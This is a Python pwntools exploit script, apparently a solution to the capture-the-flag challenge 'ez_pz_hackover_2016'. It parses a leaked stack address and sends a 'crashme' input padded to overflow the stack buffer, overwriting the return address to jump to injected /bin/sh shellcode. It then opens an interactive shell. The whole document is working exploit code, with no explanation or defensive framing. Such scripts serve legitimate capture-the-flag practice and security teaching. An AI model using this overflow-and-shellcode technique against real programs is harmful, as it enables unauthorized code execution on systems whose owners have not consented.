from pwn import *

context.arch = 'i386'
r = process(["../../libc/ld-2.23_86.so","./ez_pz_hackover_2016"],
            env={"LD_PRELOAD":"../../libc/libc-2.23_86.so"})
r.recvuntil(': ')
shellcode_addr = int(r.recvline()[2:-1], 16) - 0x1C
r.recvuntil("> ")
r.sendline('crashme\x00' + 'a' * 0x12 + p32(shellcode_addr) + asm(shellcraft.sh()))
r.recvuntil('crashme!\n')
r.interactive()
